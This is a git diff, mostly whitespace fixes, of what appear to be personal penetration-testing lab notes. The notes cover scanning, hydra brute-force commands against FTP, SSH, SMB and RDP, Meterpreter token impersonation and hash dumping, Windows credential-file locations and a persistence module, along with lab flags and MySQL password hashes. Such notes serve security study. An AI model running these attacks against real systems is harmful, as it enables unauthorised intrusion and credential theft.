@@ -12,6 +12,7 @@ And if you get multiple ips you can safely assume that you are dealing with some
 
 Whenever we go the website the main things to find is any names or email address as it can lead to potential usernames or hidden domains.
 
+
 While looking for info on website the most important thing to look for important files. This could potentially give some file name which were not intended to be public. Some of the webpages are:
 ```
 robots.txt
@@ -62,7 +63,7 @@ Creating a map of the entire organization we are having a pentest on.
 * Ping Sweep: ICMP Echo request => ```fping -ag (ip) 2>/dev/null```
 * Nmap Scans:
 	- ```nmap -sn (ip) --send-ip```
-	- ```nmap -sn -iL targets.txt``` 
+	- ```nmap -sn -iL targets.txt```
 
 
 ### Port Scanning
@@ -71,7 +72,7 @@ Creating a map of the entire organization we are having a pentest on.
 - ```nmap -F (ip)```: perform a fast scan on the ip
 - ```nmap -Pn -p- -T5 (ip)```: Scan all the ports.(Will take a long time).
 - ```nmap -Pn -sT (ip)```: Tcp scan
-- ```nmap -Pn -sU (ip)```: Udp scan 
+- ```nmap -Pn -sU (ip)```: Udp scan
 - ```nmap -sV (ip)```: Service Version detection.
 - ```nmap -O --osscan-guess (ip)```: OS scan (you need to be root for this)
 - ```nmap -sS (ip)```: Stealth scan
@@ -94,10 +95,10 @@ It stands for server messege block. It is a Windows implementation for file shar
 
 ## FTP
 
-File transfer protocol 
+File transfer protocol
 Check for anonymous login
 
-Then try Bruteforcing the ftp 
+Then try Bruteforcing the ftp
 ```bash
 hydra -L username_wordlist.txt -P password_wordlist.txt ip ftp
 ```
@@ -142,7 +143,7 @@ Primiraly focused on targeting an operating system like windows or linux
 * RCE
 * DOS
 
-Windows have several services and protocols that can be run on hosts. 
+Windows have several services and protocols that can be run on hosts.
 
 Common Services:
 
@@ -151,7 +152,7 @@ Common Services:
 * SMB (tcp 445 (file sharing))
 * RDP (tcp 3389)
 * WinRM (tcp 5986)
- 
+
 
 ## Exploiting Windows Vulns
 
@@ -196,7 +197,7 @@ flag: e0da81a9cd42b261bc9b90d15f780433
 Default Port : 3389
 default Attack type : Brute force
 
-Brute Forcing using hydra if RDP is configured on port 3333:: 
+Brute Forcing using hydra if RDP is configured on port 3333::
 ```hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.5.21.28 -s 3333```
 
 eg lab:
@@ -223,7 +224,7 @@ eg lab flag : 3c716f95616eec677a7078f92657a230
 ### Windows kernal Exploits
 
 Kernel is computer program that acts as a translation between hardware and software. Windows NT is the kernel that comes prepackaged with the windows. There are two main modes:
- 
+
 * **User Mode**: limited access to the resources
 * **kernel Mode**: Unrestricited access to the resources, So if we get any vuln in kernel we are always gonna have the root access.
 
@@ -260,10 +261,10 @@ There are two types of access tokens:
 **Windows privilleges**:
 You can check the privs with the help of metasploit command ```getprivs```.
 
-- SetAssignPrimaryToken: Allows user to impersonate the token 
+- SetAssignPrimaryToken: Allows user to impersonate the token
 - SeCreateToken: Create a token with administrative privilleges
 - SeImpersonatePrivillege
-With the help of Metasploit you 
+With the help of Metasploit you
 can just load the ```load incognito``` and see the tokens available by the meterpreter command
 ```list_tokens -u```
 f
@@ -300,7 +301,7 @@ Most of the time while configuring the unattended software config files are left
 That file can be found on:
 ```C:\Windows\Panther\Unattend.xml```
 
-You can also use meterpreter modules like kiwi to dump the hashes and many other things and can be used by 
+You can also use meterpreter modules like kiwi to dump the hashes and many other things and can be used by
 ```load kiwi```
 
 eg lab:
@@ -316,14 +317,14 @@ syskey: 377af0de68bdc918d22c57a263d38326
 
 ### Exploiting FTP
 Default attack:  Bruteforce with hydra
-Script: 
+Script:
 ```bash
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $ip -t 4 ftp
 ```
 
 ### Exploiting SSH
 Default attack:  Bruteforce with hydra
-Script: 
+Script:
 ```bash
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/common_passwords.txt $ip -t 4 ssh
 ```
@@ -333,7 +334,7 @@ flag: eb09cc6f1cd72756da145892892fbf5a
 
 ### Exploiting SMb
 Default attack:  Bruteforce with hydra
-Script: 
+Script:
 ```bash
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_user.txt -P usr/share/metasploit-framework/data/wordlists/common_passwords.txt $ip smb
 ```
@@ -439,13 +440,13 @@ auxiliary/scanner/mysql/mysql_writable_dirs
 ```
 
 
-eg lab: 
+eg lab:
 root:twinkle
 [+] 192.225.207.3:3306 -                User: root Host: localhost Password Hash:
 A0E23B565BACCE3E70D223915ABF2554B2540144
-[+] 192.225.207.3:3306 -                User: root Host: 891b50fafb0f Password Hash: 
-[+] 192.225.207.3:3306 -                User: root Host: 127.0.0.1 Password Hash: 
-[+] 192.225.207.3:3306 -                User: root Host: ::1 Password Hash: 
+[+] 192.225.207.3:3306 -                User: root Host: 891b50fafb0f Password Hash:
+[+] 192.225.207.3:3306 -                User: root Host: 127.0.0.1 Password Hash:
+[+] 192.225.207.3:3306 -                User: root Host: ::1 Password Hash:
 [+] 192.225.207.3:3306 -                User: debian-sys-maint Host: localhost Password Hash: F4E71A0BE028B3688230B992EEAC70BC598FA723
 [+] 192.225.207.3:3306 -                User: root Host: % Password Hash: A0E23B565BACCE3E70D223915ABF2554B2540144
 [+] 192.225.207.3:3306 -                User: filetest Host: % Password Hash: 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
@@ -456,7 +457,7 @@ A0E23B565BACCE3E70D223915ABF2554B2540144
 [+] 192.225.207.3:3306 -                User: sysadmin Host: localhost Password Hash: 78A1258090DAA81738418E11B73EB494596DFDD3
 
 
-## SMTP enumeration 
+## SMTP enumeration
 
 ```
    1  auxiliary/client/smtp/emailer                             normal  No     Generic Emailer (SMTP)
@@ -469,7 +470,7 @@ A0E23B565BACCE3E70D223915ABF2554B2540144
    8  auxiliary/server/capture/smtp                             normal  No     Authentication Capture: SMTP
 ```
 
-## WMAP module for web server enumeration automation 
+## WMAP module for web server enumeration automation
 
 * ```load wmap``` to load the plugin
 * ```wmap_sites -a (ip)``` to load the ip
@@ -492,14 +493,3 @@ A0E23B565BACCE3E70D223915ABF2554B2540144
 ## establishing persistence
 
 Metasploit module : `windows/local/persistence_service`
-
-
-
-
-
-
-
-
-
-
-
